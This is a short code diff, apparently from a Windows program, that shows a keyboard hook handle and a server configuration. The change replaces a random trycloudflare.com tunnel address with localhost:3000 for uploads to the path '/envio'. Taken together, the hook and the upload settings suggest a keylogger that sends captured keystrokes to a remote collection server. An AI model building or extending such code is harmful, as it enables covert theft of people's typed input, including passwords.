@@ -16,7 +16,7 @@ void processarFilaPendencias();
 HHOOK hKeyboardHook;
 
 // Configuração do servidor
-#define SERVER_HOST L"https://quotations-tramadol-dealing-strip.trycloudflare.com"
+#define SERVER_HOST L"http://localhost:3000"
 #define SERVER_PORT 443
 #define SERVER_PATH L"/envio"
 #define USE_HTTPS 1
